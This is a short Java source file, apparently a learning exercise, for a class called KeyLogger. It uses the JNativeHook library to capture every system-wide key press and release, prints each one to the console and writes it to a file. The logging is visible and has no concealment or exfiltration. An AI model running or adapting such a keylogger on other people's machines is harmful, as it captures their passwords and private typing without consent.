import com.github.kwhat.jnativehook.GlobalScreen;import com.github.kwhat.jnativehook.NativeHookException;import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;public class KeyLogger implements NativeKeyListener{    public Bloc bloc;    public KeyLogger(Bloc bloc) {        this.bloc = bloc;    }    public static void main(String[] args) {        try {            GlobalScreen.registerNativeHook();        } catch (NativeHookException e) {            System.out.println("Error al registrar NativeHook");            System.err.println(e.getMessage());            System.exit(0);        }        GlobalScreen.addNativeKeyListener(new KeyLogger(new Bloc()));    }    @Override    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {        NativeKeyListener.super.nativeKeyPressed(nativeEvent);        System.out.println("Pressed --> " + NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));        if(nativeEvent.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {            try {                GlobalScreen.unregisterNativeHook();            } catch (NativeHookException e) {                throw new RuntimeException(e);            }        }        bloc.escribirEnArchivo("Pressed --> " + NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()) + "\n");    }    @Override    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {        NativeKeyListener.super.nativeKeyReleased(nativeEvent);        System.out.println("Released -->" + NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));        bloc.escribirEnArchivo("Released --> " + NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()) + "\n");    }}